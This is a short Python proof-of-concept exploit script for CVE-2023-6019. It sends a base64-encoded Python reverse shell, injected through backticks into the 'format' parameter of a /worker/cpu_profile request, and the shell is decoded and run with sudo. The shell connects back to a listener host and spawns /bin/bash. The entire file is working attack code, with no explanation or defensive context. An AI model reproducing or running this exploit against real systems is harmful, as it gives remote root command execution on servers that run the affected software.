import argparse
import base64 
import requests 

help = "CVE-2023-6019 Proof Of Concept"
parser = argparse.ArgumentParser(description=help)
parser.add_argument("-t", help="Target Ip Address 127.0.0.1", required=True)
parser.add_argument("-p", help="Target Port", required=True)
parser.add_argument("-l", help="Listener Host", default="127.0.0.1")
parser.add_argument("-lp", help="Listener Port", default="4444")

args = parser.parse_args()
target = args.t
port = args.p
listener_ip = args.l
listener_port = args.lp

str_command = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{listener_ip}\",{listener_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
bytes_command = str_command.encode("ascii")
base64_bytes = base64.b64encode(bytes_command) 
base64_encoded = base64_bytes.decode("ascii") 

print("Sending Payload")
cmd = f"http://{target}:{port}/worker/cpu_profile?pid=3354&ip={target}&duration=5&native=0&format=`echo%20{base64_encoded}|base64$IFS-d|sudo%20sh`"

requests.get(cmd)


